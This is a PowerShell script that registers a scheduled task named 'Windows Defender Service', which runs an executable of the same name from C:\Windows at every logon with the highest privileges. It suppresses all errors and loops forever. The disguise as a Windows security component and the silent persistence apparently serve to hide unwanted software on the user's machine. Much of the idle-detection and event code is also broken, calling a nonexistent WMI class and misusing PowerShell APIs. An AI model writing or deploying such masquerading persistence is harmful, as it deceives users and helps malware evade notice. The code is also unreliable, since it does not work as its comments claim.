# Task Name and Path
$TaskName = "Windows Defender Service"
$TaskPath = "C:\Windows\Windows Defender Service.exe"

# Idle Time (in minutes)
$IdleTimeMinutes = 1

# Function to start the task
function Start-MyTask {
    if (Test-Path $TaskPath) {
        try {
            $Action = New-ScheduledTaskAction -Execute $TaskPath
            $Trigger = New-ScheduledTaskTrigger -AtLogOn
            $Principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -RunLevel Highest
            $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal
            Register-ScheduledTask -TaskName $TaskName -InputObject $Task -User ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) | Out-Null
        }
        catch {} # Suppress errors
    }
}

# Function to stop the task
function Stop-MyTask {
    try {
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false | Out-Null
    }
    catch {} # Suppress errors
}

# Function to check idle state
function Check-IdleState {
    try {
        $IdleTimeSeconds = ([System.Management.Automation.Host.UI.PSHostRawUserInterface]::new()).RawUI.IdleTimeout
        if ($IdleTimeSeconds -ge ($IdleTimeMinutes * 60)) {
            return $true
        } else {
            return $false
        }
    }
    catch {
        return $false; #return false on error.
    }
}

# Event Registration for User Logon
try {
    Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'" -SourceIdentifier LogonEvent | Out-Null
} catch {}

# Event Registration for Idle State
try {
    Register-WmiEvent -Query "SELECT * FROM Win32_IdleWin32Timing" -SourceIdentifier IdleEvent | Out-Null
} catch {}

# Event Handlers
$LogonEventHandler = {
    Start-MyTask
}

$IdleEventHandler = {
    if (Check-IdleState) {
        Stop-MyTask
    }
}

$ActiveEventHandler = {
    if (-not (Check-IdleState))
    {
        Start-MyTask
    }
}

# Register event actions
try {
    Register-ObjectEvent -InputObject (Get-EventSubscriber -SourceIdentifier LogonEvent) -EventName Received -Action $LogonEventHandler | Out-Null
    Register-ObjectEvent -InputObject (Get-EventSubscriber -SourceIdentifier IdleEvent) -EventName Received -Action $IdleEventHandler | Out-Null
    Register-ObjectEvent -InputObject (Get-EventSubscriber -SourceIdentifier IdleEvent) -EventName Received -Action $ActiveEventHandler | Out-Null
} catch {}

# Keep the script running to listen for events
while ($true) {
    Start-Sleep -Seconds 60
}

# Cleanup (Will not be reached unless script is manually stopped)
try{
    Unregister-Event -SourceIdentifier LogonEvent | Out-Null
    Unregister-Event -SourceIdentifier IdleEvent | Out-Null
} catch {}
